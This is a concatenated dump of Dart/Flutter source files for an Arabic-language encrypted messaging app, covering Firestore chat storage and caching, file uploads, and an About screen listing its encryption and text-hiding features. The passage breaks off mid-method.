        // إرسال البيانات المحدثة للمستمعين
        final cacheKey = 'messages_${conversationId}_$_currentAgentCode';
        _messageStreamControllers[cacheKey]?.add(
          List.unmodifiable(sortedMessages),
        );
      } else {
        // إذا لم تكن هناك رسائل مخزنة مؤقتًا، فقم بتخزين الرسائل الجديدة
        _messagesCache[conversationId] = newMessages;
      }

      return newMessages;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:loadMoreMessages",
        "Error loading more messages for conversation $conversationId",
        e,
        s,
      );
      return [];
    }
  }

  /// الحصول على معلومات المستخدم مع التخزين المؤقت
  Future<ChatParticipantInfo?> getAgentInfo(String agentCode) async {
    if (agentCode.isEmpty) {
      _logger.warn(
        "FirestoreRepository:getAgentInfo",
        "Empty agent code provided",
      );
      return null;
    }

    // التحقق من التخزين المؤقت أولاً
    if (_participantInfoCache.containsKey(agentCode)) {
      _logger.debug(
        "FirestoreRepository:getAgentInfo",
        "Returning cached participant info for agent $agentCode",
      );
      return _participantInfoCache[agentCode];
    }

    try {
      final doc =
          await _firestore.collection("agent_identities").doc(agentCode).get();

      if (doc.exists) {
        final data = doc.data()!;
        final participantInfo = ChatParticipantInfo(
          agentCode: agentCode,
          displayName: data["displayName"] as String? ?? agentCode,
        );

        // تخزين في الذاكرة المؤقتة
        _participantInfoCache[agentCode] = participantInfo;

        // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
        _resetCacheExpiryTimer(
          'participant_$agentCode',
          _participantInfoCacheDuration,
        );

        return participantInfo;
      }

      _logger.warn(
        "FirestoreRepository:getAgentInfo",
        "Agent info not found for $agentCode in 'agent_identities'",
      );
      return null;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:getAgentInfo",
        "Error fetching agent info for $agentCode",
        e,
        s,
      );
      return null;
    }
  }

  /// التحقق من صحة رمز العميل مع التخزين المؤقت
  Future<bool> validateAgentCode(String agentCode) async {
    if (agentCode.isEmpty) {
      _logger.warn(
        "FirestoreRepository:validateAgentCode",
        "Empty agent code provided",
      );
      return false;
    }

    // التحقق من التخزين المؤقت أولاً
    if (_agentCodeValidationCache.containsKey(agentCode)) {
      _logger.debug(
        "FirestoreRepository:validateAgentCode",
        "Returning cached validation result for agent $agentCode",
      );
      return _agentCodeValidationCache[agentCode]!;
    }

    try {
      final doc =
          await _firestore.collection("agent_identities").doc(agentCode).get();

      final isValid = doc.exists;

      // تخزين في الذاكرة المؤقتة
      _agentCodeValidationCache[agentCode] = isValid;

      // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
      _resetCacheExpiryTimer(
        'validation_$agentCode',
        _participantInfoCacheDuration,
      );

      return isValid;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:validateAgentCode",
        "Error validating agent code $agentCode",
        e,
        s,
      );
      return false;
    }
  }

  /// إنشاء أو الحصول على محادثة مع المشاركين
  Future<String?> createOrGetConversation(
    List<String> participantAgentCodes,
    Map<String, ChatParticipantInfo> participantInfoMap, {
    String? groupTitle,
  }) async {
    _logger.info(
      "FirestoreRepository:createOrGetConversation",
      "Attempting with participants: $participantAgentCodes. Current user: $_currentAgentCode",
    );

    final allParticipantsSorted = List<String>.from(participantAgentCodes);
    if (!allParticipantsSorted.contains(_currentAgentCode)) {
      allParticipantsSorted.add(_currentAgentCode);
    }
    allParticipantsSorted.sort();

    // تجميع معلومات المشاركين
    final Map<String, ChatParticipantInfo> finalParticipantInfoMap =
        Map<String, ChatParticipantInfo>.from(participantInfoMap);

    // إضافة معلومات المستخدم الحالي إذا لم تكن موجودة
    if (!finalParticipantInfoMap.containsKey(_currentAgentCode)) {
      final currentUserInfo = await getAgentInfo(_currentAgentCode);
      if (currentUserInfo != null) {
        finalParticipantInfoMap[_currentAgentCode] = currentUserInfo;
      } else {
        finalParticipantInfoMap[_currentAgentCode] = ChatParticipantInfo(
          agentCode: _currentAgentCode,
          displayName:
              "أنا (${_currentAgentCode.substring(0, min(3, _currentAgentCode.length))}..)",
        );
      }
    }

    // جمع معلومات المشاركين الآخرين
    for (final code in allParticipantsSorted) {
      if (!finalParticipantInfoMap.containsKey(code)) {
        final info = await getAgentInfo(code);
        if (info != null) {
          finalParticipantInfoMap[code] = info;
        } else {
          _logger.error(
            "FirestoreRepository:createOrGetConversation",
            "Could not fetch participant info for $code",
          );
          return null;
        }
      }
    }

    // التحقق من وجود محادثة ثنائية
    if (allParticipantsSorted.length == 2) {
      try {
        final existingConversation =
            await _firestore
                .collection("conversations")
                .where("participants", isEqualTo: allParticipantsSorted)
                .limit(1)
                .get();

        if (existingConversation.docs.isNotEmpty) {
          final doc = existingConversation.docs.first;
          final docId = doc.id;
          final data = doc.data() as Map<String, dynamic>?;
          final deletedForUsers =
              data?["deletedForUsers"] as Map<String, dynamic>?;

          // إذا كانت المحادثة محذوفة للمستخدم الحالي، قم بإلغاء الحذف
          if (deletedForUsers != null &&
              deletedForUsers[_currentAgentCode] == true) {
            await _firestore.collection("conversations").doc(docId).update({
              "deletedForUsers.$_currentAgentCode": FieldValue.delete(),
              "updatedAt": FieldValue.serverTimestamp(),
            });
          }

          _logger.info(
            "FirestoreRepository:createOrGetConversation",
            "Found/Reactivated existing 2-party conversation: $docId",
          );
          return docId;
        }
      } catch (e, s) {
        _logger.error(
          "FirestoreRepository:createOrGetConversation",
          "Error checking for existing conversation",
          e,
          s,
        );
      }
    }

    // إنشاء محادثة جديدة
    final now = DateTime.now();
    final newConversation = ChatConversation(
      id: "",
      participants: allParticipantsSorted,
      participantInfo: finalParticipantInfoMap,
      conversationTitle:
          groupTitle ??
          (allParticipantsSorted.length > 2
              ? "مجموعة جديدة (${allParticipantsSorted.length})"
              : "محادثة"),
      lastMessageText: "تم إنشاء المحادثة.",
      lastMessageTimestamp: now,
      lastMessageSenderAgentCode: _currentAgentCode,
      createdAt: now,
      updatedAt: now,
      deletedForUsers: {},
    );

    try {
      final docRef = await _firestore
          .collection("conversations")
          .add(newConversation.toFirestore());

      _logger.info(
        "FirestoreRepository:createOrGetConversation",
        "Successfully created new conversation with ID: ${docRef.id}",
      );

      // تحديث التخزين المؤقت
      final createdConversation = newConversation.copyWith(id: docRef.id);
      _conversationsCache[docRef.id] = createdConversation;

      // إرسال البيانات المحدثة للمستمعين
      final cacheKey = 'conversations_$_currentAgentCode';
      if (_conversationStreamControllers.containsKey(cacheKey)) {
        final conversations =
            _conversationsCache.values.toList()
              ..sort((a, b) => b.updatedAt.compareTo(a.updatedAt));
        _conversationStreamControllers[cacheKey]?.add(conversations);
      }

      return docRef.id;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:createOrGetConversation",
        "Failed to create new conversation in Firestore",
        e,
        s,
      );
      return null;
    }
  }

  /// إرسال رسالة إلى محادثة
  Future<bool> sendMessage(String conversationId, ChatMessage message) async {
    _logger.info(
      "FirestoreRepository:sendMessage",
      "Sending message to conversation $conversationId by agent $_currentAgentCode",
    );

    if (conversationId.isEmpty || message.senderId != _currentAgentCode) {
      _logger.error(
        "FirestoreRepository:sendMessage",
        "Invalid params: convId empty or senderId mismatch",
      );
      return false;
    }

    try {
      final messageData = message.toFirestore();
      messageData["timestamp"] = FieldValue.serverTimestamp();

      final messageDocRef = await _firestore
          .collection("conversations")
          .doc(conversationId)
          .collection("messages")
          .add(messageData);

      // تحديث بيانات المحادثة
      Map<String, dynamic> updateData = {
        "lastMessageText": message.text ?? (message.fileName ?? "مرفق"),
        "lastMessageTimestamp": FieldValue.serverTimestamp(),
        "lastMessageSenderAgentCode": message.senderId,
        "updatedAt": FieldValue.serverTimestamp(),
        "deletedForUsers": {},
      };

      await _firestore
          .collection("conversations")
          .doc(conversationId)
          .update(updateData);

      // تحديث التخزين المؤقت للرسائل
      if (_messagesCache.containsKey(conversationId)) {
        final updatedMessage = message.copyWith(id: messageDocRef.id);
        _messagesCache[conversationId]!.add(updatedMessage);

        // إرسال البيانات المحدثة للمستمعين
        final cacheKey = 'messages_${conversationId}_$_currentAgentCode';
        if (_messageStreamControllers.containsKey(cacheKey)) {
          _messageStreamControllers[cacheKey]?.add(
            List.unmodifiable(_messagesCache[conversationId]!),
          );
        }
      }

      return true;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:sendMessage",
        "Failed to send message to conversation $conversationId",
        e,
        s,
      );
      return false;
    }
  }

  /// تحميل ملف إلى Firebase Storage
  Future<String?> uploadFile(
    List<int> fileBytes,
    String fileName,
    String conversationId,
  ) async {
    _logger.info(
      "FirestoreRepository:uploadFile",
      "Uploading file $fileName to conversation $conversationId",
    );

    if (fileBytes.isEmpty || fileName.isEmpty || conversationId.isEmpty) {
      _logger.error("FirestoreRepository:uploadFile", "Invalid params");
      return null;
    }

    try {
      final String filePath =
          "chat_attachments/$conversationId/${DateTime.now().millisecondsSinceEpoch}_$fileName";
      final ref = _storage.ref().child(filePath);

      final uploadTask = ref.putData(Uint8List.fromList(fileBytes));
      final snapshot = await uploadTask;

      final downloadUrl = await snapshot.ref.getDownloadURL();
      _logger.info(
        "FirestoreRepository:uploadFile",
        "File uploaded successfully. URL: $downloadUrl",
      );

      return downloadUrl;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:uploadFile",
        "Error uploading file",
        e,
        s,
      );
      return null;
    }
  }

  /// إعادة تعيين مؤقت انتهاء صلاحية التخزين المؤقت
  void _resetCacheExpiryTimer(String cacheKey, Duration duration) {
    _cacheExpiryTimers[cacheKey]?.cancel();
    _cacheExpiryTimers[cacheKey] = Timer(duration, () {
      _logger.debug(
        "FirestoreRepository:_resetCacheExpiryTimer",
        "Cache expired for key $cacheKey",
      );

      if (cacheKey.startsWith('conversations_')) {
        // لا نقوم بمسح التخزين المؤقت للمحادثات، فقط نعيد تحميلها
        // لأن التدفق المباشر سيقوم بتحديثها
      } else if (cacheKey.startsWith('messages_')) {
        final conversationId = cacheKey.split('_')[1];
        _messagesCache.remove(conversationId);
      } else if (cacheKey.startsWith('participant_')) {
        final agentCode = cacheKey.substring('participant_'.length);
        _participantInfoCache.remove(agentCode);
      } else if (cacheKey.startsWith('validation_')) {
        final agentCode = cacheKey.substring('validation_'.length);
        _agentCodeValidationCache.remove(agentCode);
      }

      _cacheExpiryTimers.remove(cacheKey);
    });
  }

  /// تنظيف الموارد عند التخلص من الكائن
  void dispose() {
    // إلغاء جميع المؤقتات
    for (final timer in _cacheExpiryTimers.values) {
      timer.cancel();
    }
    _cacheExpiryTimers.clear();

    // إغلاق جميع وحدات التحكم بالتدفق
    for (final controller in _conversationStreamControllers.values) {
      controller.close();
    }
    _conversationStreamControllers.clear();

    for (final controller in _messageStreamControllers.values) {
      controller.close();
    }
    _messageStreamControllers.clear();

    // مسح التخزين المؤقت
    _conversationsCache.clear();
    _messagesCache.clear();
    _participantInfoCache.clear();
    _agentCodeValidationCache.clear();
  }
}



// ------------------------------ نهاية الملف: firestore_repository.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: collected_data.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\models\collected_data.dart
// ----------------------------------------------------------------------




// ------------------------------ نهاية الملف: collected_data.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: about_tab.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\about_tab\about_tab.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:package_info_plus/package_info_plus.dart'; // Added for dynamic version

class AboutTab extends StatefulWidget {
  const AboutTab({super.key});

  @override
  State<AboutTab> createState() => _AboutTabState();
}

class _AboutTabState extends State<AboutTab> {
  String _appVersion = '1.0.0'; // Default version

  @override
  void initState() {
    super.initState();
    _loadVersionInfo();
  }

  Future<void> _loadVersionInfo() async {
    try {
      final PackageInfo packageInfo = await PackageInfo.fromPlatform();
      if (mounted) {
        setState(() {
          _appVersion = "${packageInfo.version}+${packageInfo.buildNumber}";
        });
      }
    } catch (e) {
      // Log error or handle if needed, for now, keep default
      print('Failed to get package info: $e');
    }
  }

  Widget _buildSectionTitle(BuildContext context, String title) {
    final theme = Theme.of(context);
    return Padding(
      padding: const EdgeInsets.only(top: 24.0, bottom: 8.0),
      child: Text(
        title,
        style: theme.textTheme.titleLarge?.copyWith(fontWeight: FontWeight.bold),
        textAlign: TextAlign.center,
      ),
    );
  }

  Widget _buildInfoTile(
      BuildContext context, IconData icon, String title, String subtitle,
      {VoidCallback? onTap, bool isExternalLink = false}) {
    final theme = Theme.of(context);
    return Card(
      margin: const EdgeInsets.symmetric(vertical: 6.0, horizontal: 4.0),
      elevation: 1.5,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      child: ListTile(
        leading: Icon(icon, color: theme.primaryColor, size: 28),
        title: Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
        subtitle: Text(subtitle,
            style: TextStyle(color: theme.textTheme.bodySmall?.color?.withOpacity(0.8))),
        onTap: onTap,
        trailing: onTap != null
            ? Icon(isExternalLink ? Icons.open_in_new : Icons.arrow_forward_ios, size: 18, color: Colors.grey[600])
            : null,
      ),
    );
  }

  Future<void> _launchUrl(BuildContext context, String urlString) async {
    final Uri url = Uri.parse(urlString);
    final bool isMounted = mounted; // Capture mounted state before the async gap
    if (!await launchUrl(
      url,
      mode: LaunchMode.externalApplication,
    )) {
      if (isMounted) { // Check mounted state before using context
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('تعذر فتح الرابط: $urlString'),
            backgroundColor: Colors.redAccent,
          ),
        );
      }
    }
  }

  Future<void> _sendEmail(BuildContext context, String email) async {
    final Uri emailLaunchUri = Uri(
      scheme: 'mailto',
      path: email,
      query: 'subject=استفسار بخصوص تطبيق مخفي الرسائل الآمن',
    );
    final bool isMounted = mounted;
    if (!await launchUrl(emailLaunchUri)) {
      if (isMounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('تعذر فتح تطبيق البريد: $email'),
            backgroundColor: Colors.redAccent,
          ),
        );
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);

    return Directionality(
      textDirection: TextDirection.rtl,
      child: Scaffold(
        // appBar: AppBar(
        //   title: const Text('حول التطبيق'),
        //   elevation: 0.5,
        // ),
        body: SingleChildScrollView(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: theme.primaryColor.withOpacity(0.1),
                  border: Border.all(color: theme.primaryColor.withOpacity(0.3), width: 2)
                ),
                child: Icon(
                  Icons.security_rounded, // Consider a more unique app icon if available
                  size: 60,
                  color: theme.primaryColor,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                'مخفي الرسائل الآمن',
                style: theme.textTheme.headlineSmall?.copyWith(fontWeight: FontWeight.bold),
              ),
              Text(
                'الإصدار: $_appVersion',
                style: theme.textTheme.bodySmall?.copyWith(color: Colors.grey[600]),
              ),
              const SizedBox(height: 12),
              Text(
                'تم التطوير بواسطة: Zero One',
                style: theme.textTheme.bodyMedium?.copyWith(fontStyle: FontStyle.italic, color: Colors.grey[700]),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 24),
              const Divider(thickness: 0.8),

              _buildSectionTitle(context, 'وصف التطبيق'),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 8.0),
                child: Text(
                  'تطبيق يهدف إلى توفير طريقة آمنة لتشفير وإخفاء رسائلك الخاصة. يستخدم التطبيق خوارزميات تشفير قوية (AES-GCM) وتقنيات إخفاء لحماية معلوماتك، مع واجهة سهلة الاستخدام وميزات متنوعة لضمان خصوصيتك.',
                  style: theme.textTheme.bodyMedium?.copyWith(height: 1.5),
                  textAlign: TextAlign.center,
                ),
              ),
              const SizedBox(height: 24),
              
              _buildSectionTitle(context, 'الميزات الرئيسية'),
              _buildInfoTile(
                context,
                Icons.enhanced_encryption_rounded,
                'تشفير متقدم',
                'استخدام تشفير AES-256 GCM الموثوق لضمان أقصى درجات السرية والسلامة لبياناتك.',
              ),
              _buildInfoTile(
                context,
                Icons.visibility_off_rounded,
                'إخفاء النصوص (Zero-Width)',
                'إمكانية إخفاء النص المشفر (أو أي نص آخر) داخل رسائل تبدو عادية باستخدام أحرف غير مرئية.',
              ),
               _buildInfoTile(
                context,
                Icons.image_search_rounded, // Icon for steganography
                'إخفاء في الصور (Steganography)',
                'إخفاء النصوص داخل الصور مع الحفاظ على جودة الصورة الأصلية.',
              ),
              _buildInfoTile(
                context,
                Icons.key_rounded,
                'حماية بكلمة مرور قوية',
                'اشتقاق آمن لمفتاح التشفير من كلمة المرور باستخدام PBKDF2 مع Salt لتعزيز الأمان.',
              ),
              _buildInfoTile(
                context,
                Icons.history_rounded,
                'سجل العمليات المحفوظ',
                'تتبع عمليات التشفير وفك التشفير السابقة بسهولة وأمان.',
              ),
              _buildInfoTile(
                context,
                Icons.palette_rounded,
                'تخصيص المظهر بالكامل',
                'دعم الوضع الداكن والفاتح مع إمكانية تغيير اللون الرئيسي للتطبيق ليناسب تفضيلاتك.',
              ),
              _buildInfoTile(
                context,
                Icons.no_encryption_gmailerrorred_rounded, // Decoy screen icon
                'شاشة التمويه',
                'إمكانية إعداد شاشة تمويه تظهر عند إدخال كلمة مرور خاطئة لحماية إضافية.',
              ),
               _buildInfoTile(
                context,
                Icons.delete_sweep_rounded, // Self-destruct icon
                'التدمير الذاتي للرسائل (تجريبي)',
                'خيار لحذف الرسائل بشكل آمن بعد فترة محددة (ميزة تحت التطوير).',
              ),

              const SizedBox(height: 12),
              const Divider(thickness: 0.8),
              _buildSectionTitle(context, 'دليل الاستخدام السريع'),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 16.0),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    '1. اختر العملية المطلوبة من القائمة الرئيسية (تشفير، فك تشفير، إخفاء، كشف، إلخ).',
                    '2. أدخل النص الأصلي أو النص المشفر/المخفي في الحقل المخصص.',
                    '3. إذا كنت تستخدم ميزة الإخفاء، أدخل نص الغطاء الذي سيتم إخفاء المعلومة بداخله.',
                    '4. أدخل كلمة مرور قوية وآمنة إذا كنت تستخدم عمليات التشفير.',
                    '5. اضغط على زر "تنفيذ" أو ما يماثله للحصول على النتيجة.',
                    '6. يمكنك نسخ النتيجة إلى الحافظة أو مشاركتها مباشرة.',
                    '7. استكشف الإعدادات لتخصيص مظهر التطبيق وسلوكه.',
                  ]
                      .map((text) => Padding(
                          padding: const EdgeInsets.symmetric(vertical: 4.0),
                          child: Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text('• ', style: TextStyle(color: theme.primaryColor, fontWeight: FontWeight.bold)),
                              Expanded(child: Text(text, style: theme.textTheme.bodyMedium?.copyWith(height: 1.4))),
                            ],
                          )))
                      .toList(),
                ),
              ),

              const SizedBox(height: 12),
              const Divider(thickness: 0.8),
              _buildSectionTitle(context, 'معلومات إضافية وروابط'),
              _buildInfoTile(
                context,
                Icons.contact_mail_rounded,
                'تواصل معنا',
                'للإبلاغ عن مشكلة أو لتقديم اقتراحات: contact@example.com',
                onTap: () => _sendEmail(context, 'contact@example.com'),
              ),
              _buildInfoTile(
                context,
                Icons.privacy_tip_rounded,
                'سياسة الخصوصية',
                'اطلع على كيفية تعاملنا مع بياناتك.',
                onTap: () => _launchUrl(context, 'https://example.com/privacy-policy'), // Replace with actual URL
                isExternalLink: true,
              ),
              _buildInfoTile(
                context,
                Icons.gavel_rounded,
                'شروط الخدمة',
                'اقرأ شروط وأحكام استخدام التطبيق.',
                onTap: () => _launchUrl(context, 'https://example.com/terms-of-service'), // Replace with actual URL
                isExternalLink: true,
              ),
              _buildInfoTile(
                context,
                Icons.code_rounded,
                'الكود المصدري (GitHub)',
                'المشروع مفتوح المصدر، يمكنك المساهمة أو الاطلاع على الكود هنا.',
                onTap: () => _launchUrl(context, 'https://github.com/YOUR_USERNAME/YOUR_REPOSITORY'), // Replace with actual URL
                isExternalLink: true,
              ),
              _buildInfoTile(
                context,
                Icons.favorite_rounded,
                'شكر وتقدير',
                'شكراً للمجتمعات والمكتبات مفتوحة المصدر التي ساهمت في بناء هذا التطبيق.',
              ),
              const SizedBox(height: 30),
              Text(
                '© ${DateTime.now().year} Zero One. جميع الحقوق محفوظة.',
                style: theme.textTheme.bodySmall?.copyWith(color: Colors.grey[500]),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 20),
            ],
          ),
        ),
      ),
    );
  }
}




// ------------------------------ نهاية الملف: about_tab.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: api_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\api_service.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/api_service.dart
import "dart:async";
import "dart:io"; // Required for File operations
import "dart:math";

import "package:cloud_firestore/cloud_firestore.dart";
import "package:firebase_storage/firebase_storage.dart"; // Import Firebase Storage
import "package:file_picker/file_picker.dart"; // Required for PlatformFile
import "package:path/path.dart" as p; // For path manipulation

import "../../core/logging/logger_service.dart";
import "../../data/models/chat/chat_conversation.dart";
import "../../data/models/chat/chat_message.dart";

class ApiService {
  final FirebaseFirestore _firestore;
  final FirebaseStorage _storage; // Add Firebase Storage instance
  final LoggerService _logger;
  final String _currentAgentCode;

  String get currentAgentCodeValue => _currentAgentCode;

  ApiService(this._firestore, this._storage, this._logger, this._currentAgentCode) {
    if (_currentAgentCode.isEmpty) {
      _logger.error("ApiService:Constructor",
          "CRITICAL: ApiService initialized with an empty agent code!");
    }
    _logger.info("ApiService:Constructor",
        "ApiService initialized for agent: $_currentAgentCode");
  }

  // Method to upload file to Firebase Storage
  Future<String?> uploadFileToStorage(PlatformFile platformFile, String conversationId) async {
    if (platformFile.path == null) {
      _logger.error("ApiService:uploadFileToStorage", "File path is null for ${platformFile.name}");
      return null;
    }
    File file = File(platformFile.path!);
    String fileName = "${DateTime.now().millisecondsSinceEpoch}_${p.basename(file.path)}";
    String filePath = "chat_attachments/$conversationId/$fileName";

    _logger.info("ApiService:uploadFileToStorage", "Attempting to upload ${platformFile.name} to $filePath");

    try {
      UploadTask uploadTask = _storage.ref().child(filePath).putFile(file);
      TaskSnapshot snapshot = await uploadTask;
      String downloadUrl = await snapshot.ref.getDownloadURL();
      _logger.info("ApiService:uploadFileToStorage", "File ${platformFile.name} uploaded successfully. URL: $downloadUrl");
      return downloadUrl;
    } on FirebaseException catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "FirebaseException during upload for ${platformFile.name}: ${e.message}", e, s);
      return null;
    } catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "Generic error during upload for ${platformFile.name}", e, s);
      return null;
    }
  }

  Stream<List<ChatConversation>> getConversationsStream() {
    _logger.info("ApiService:getConversationsStream",
        "Fetching conversations for agent: $_currentAgentCode, excluding those marked as deleted for this agent.");
    return _firestore
        .collection("conversations")
        .where("participants", arrayContains: _currentAgentCode) // User must be a participant
        .where("deletedForUsers.$_currentAgentCode", isNotEqualTo: true) // Exclude if marked deleted for this user
        .orderBy("updatedAt", descending: true)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info(
            "ApiService:getConversationsStream", "No active conversations found for $_currentAgentCode.");
        return <ChatConversation>[];
      }
      _logger.debug("ApiService:getConversationsStream",
          "Received ${snapshot.docs.length} active conversations for $_currentAgentCode.");
      return snapshot.docs
          .map((doc) => ChatConversation.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getConversationsStream", "Error in stream for $_currentAgentCode",
          error, stackTrace);
      return <ChatConversation>[];
    });
  }

  Stream<List<ChatMessage>> getMessagesStream(String conversationId) {
    _logger.info("ApiService:getMessagesStream",
        "Fetching for conversation $conversationId");
    if (conversationId.isEmpty) {
      _logger.warn("ApiService:getMessagesStream",
          "Received empty conversationId. Returning empty stream.");
      return Stream.value([]);
    }
    // Note: Messages are not soft-deleted individually in this scheme.
    // If a conversation is soft-deleted for a user, they won't see it, thus won't fetch its messages.
    return _firestore
        .collection("conversations")
        .doc(conversationId)
        .collection("messages")
        .orderBy("timestamp", descending: false)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info("ApiService:getMessagesStream",
            "No messages found for $conversationId.");
        return <ChatMessage>[];
      }
      _logger.debug("ApiService:getMessagesStream",
          "Received ${snapshot.docs.length} messages for $conversationId.");
      return snapshot.docs
          .map((doc) => ChatMessage.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getMessagesStream",
          "Error in stream for $conversationId", error, stackTrace);
      return <ChatMessage>[];
    });
  }

  Future<ChatParticipantInfo?> getAgentInfo(String agentCodeToFetch) async {
    _logger.info("ApiService:getAgentInfo",
        "Fetching info for agent_code: $agentCodeToFetch");
    if (agentCodeToFetch.isEmpty) {
      _logger.warn(
          "ApiService:getAgentInfo", "Received empty agentCodeToFetch.");
      return null;
    }
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToFetch)
          .get();
      if (doc.exists) {
        final data = doc.data()!;
        _logger.debug("ApiService:getAgentInfo",
            "Agent $agentCodeToFetch found. DisplayName: ${data["displayName"]}");
        return ChatParticipantInfo(
          agentCode: agentCodeToFetch,
          displayName: data["displayName"] as String? ?? agentCodeToFetch,
        );
      }
      _logger.warn("ApiService:getAgentInfo",
          "Agent info not found for $agentCodeToFetch in 'agent_identities'.");
      return null;
    } catch (e, s) {
      _logger.error("ApiService:getAgentInfo",
          "Error fetching agent info for $agentCodeToFetch", e, s);
      return null;
    }
  }

  Future<String?> createOrGetConversationWithParticipants(
      List<String> participantAgentCodes,
      Map<String, ChatParticipantInfo> participantInfoMapInput,
      {String? groupTitle}) async {
    _logger.info("ApiService:createOrGetConversation",
        "Attempting with initial participants: $participantAgentCodes. Current user: $_currentAgentCode");

    final allParticipantsSorted = List<String>.from(participantAgentCodes);
    if (!allParticipantsSorted.contains(_currentAgentCode)) {
      allParticipantsSorted.add(_currentAgentCode);
    }
    allParticipantsSorted.sort();

    _logger.debug("ApiService:createOrGetConversation",
        "All sorted participants: $allParticipantsSorted");

    var finalParticipantInfoMap =
        Map<String, ChatParticipantInfo>.from(participantInfoMapInput);
    if (!finalParticipantInfoMap.containsKey(_currentAgentCode)) {
      final currentUserInfo = await getAgentInfo(_currentAgentCode);
      if (currentUserInfo != null) {
        finalParticipantInfoMap[_currentAgentCode] = currentUserInfo;
      } else {
        _logger.warn("ApiService:createOrGetConversation",
            "Could not fetch current user info for $_currentAgentCode. Using fallback.");
        finalParticipantInfoMap[_currentAgentCode] = ChatParticipantInfo(
            agentCode: _currentAgentCode,
            displayName:
                "أنا (${_currentAgentCode.substring(0, min(3, _currentAgentCode.length))}..)");
      }
    }
    for (String code in allParticipantsSorted) {
      if (!finalParticipantInfoMap.containsKey(code)) {
        final info = await getAgentInfo(code);
        if (info != null) {
          finalParticipantInfoMap[code] = info;
        } else {
          _logger.error("ApiService:createOrGetConversation",
              "Could not fetch participant info for $code.");
          return null;
        }
      }
    }

    // When creating/getting a conversation, we should also check the deletedForUsers status
    // If a 2-party conversation exists but is marked deleted for the current user, we might want to "un-delete" it or create a new one.
    // For now, let's assume if it exists, we return it, and the UI handles showing it if not deleted.
    // The getConversationsStream will filter it out if it's marked deleted.
    // If we want to "un-delete" upon trying to re-open, that logic would be here.
    // For simplicity, let's stick to the current behavior: if it exists, return its ID.
    // The client will then try to fetch it via getConversationsStream which will filter it if deleted.
    // This might lead to a situation where a user tries to open a chat that then disappears.
    // A better approach might be to check deletedForUsers here and if true for current user, update it to false.

    if (allParticipantsSorted.length == 2) {
      _logger.debug("ApiService:createOrGetConversation",
          "Checking for existing 2-party conversation.");
      QuerySnapshot existingConversation = await _firestore
          .collection("conversations")
          .where("participants", isEqualTo: allParticipantsSorted)
          // No filter for deletedForUsers here, as we want to find it even if soft-deleted by one party.
          .limit(1)
          .get();

      if (existingConversation.docs.isNotEmpty) {
        final doc = existingConversation.docs.first;
        final docId = doc.id;
        final data = doc.data() as Map<String, dynamic>?;
        final deletedForUsers = data?["deletedForUsers"] as Map<String, dynamic>?;

        // If it was deleted by the current user, undelete it by removing the flag.
        if (deletedForUsers != null && deletedForUsers[_currentAgentCode] == true) {
          _logger.info("ApiService:createOrGetConversation",
              "Found existing 2-party conversation $docId, previously deleted by $_currentAgentCode. Undeleting.");
          await _firestore.collection("conversations").doc(docId).update({
            "deletedForUsers.$_currentAgentCode": FieldValue.delete(), // Remove the flag
            "updatedAt": FieldValue.serverTimestamp()
          });
        }
        _logger.info("ApiService:createOrGetConversation",
            "Found/Reactivated existing 2-party conversation: $docId");
        return docId;
      }
    }

    _logger.info("ApiService:createOrGetConversation",
        "No existing suitable conversation found or it's a group chat. Creating new one.");
    final now = DateTime.now();

    final newConversation = ChatConversation(
      id: "", // Firestore will generate ID
      participants: allParticipantsSorted,
      participantInfo: finalParticipantInfoMap,
      conversationTitle: groupTitle ??
          (allParticipantsSorted.length > 2
              ? "مجموعة جديدة (${allParticipantsSorted.length})"
              : "محادثة"), // Default title
      lastMessageText: "تم إنشاء المحادثة.",
      lastMessageTimestamp: now,
      lastMessageSenderAgentCode: _currentAgentCode, // Or system message
      createdAt: now,
      updatedAt: now,
      deletedForUsers: {}, // Initialize with empty map
    );

    try {
      final docRef = await _firestore
          .collection("conversations")
          .add(newConversation.toFirestore());
